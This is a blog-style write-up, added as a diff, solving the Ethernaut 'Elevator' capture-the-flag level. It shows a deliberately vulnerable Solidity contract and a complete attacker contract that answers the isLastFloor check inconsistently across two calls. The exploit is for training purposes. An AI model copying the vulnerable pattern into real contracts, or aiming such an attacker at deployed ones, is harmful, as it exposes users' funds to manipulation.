@@ -1,0 +1,81 @@
+---
+title: Ethernaut - Elevator - Solution
+date: '2024-05-08'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Elevator CTF
+---
+
+# Ethernaut - Elevator - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+
+## Exploit
+
+The goal of this level is to set `top` to `true`.
+
+To achieve this, we need to ensure our attacker/building contract lies about the fact that the elevator reached the top floor when `isLastFloor()` is called the first time (so that we enter the `if` statement), but tells the truth when called the second time (so that we set `top` to `true`).
+
+So, to complete the level, we can simply deploy the below attacker/building contract and call `goTo(42)`.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint256 _floor) external;
+}
+
+contract ElevatorAttacker {
+    IElevator public immutable VICTIM;
+    uint256 public constant TOP_FLOOR = 42;
+
+    bool public tellTheTruth;
+
+    constructor(address victim) {
+        VICTIM = IElevator(victim);
+    }
+
+    function goTo(uint256 floor) external {
+        VICTIM.goTo(floor);
+    }
+
+    function isLastFloor(uint256 floor) external returns (bool) {
+        if (floor == TOP_FLOOR) {
+            // When the top is reached, lie when asked the first time but tell the truth when asked the second time
+            if (tellTheTruth == false) {
+                tellTheTruth = true;
+                return false;
+            } else {
+                return true;
+            }
+        } else {
+            // If the top is not reached, always tell the truth
+            return false;
+        }
+    }
+}
+```
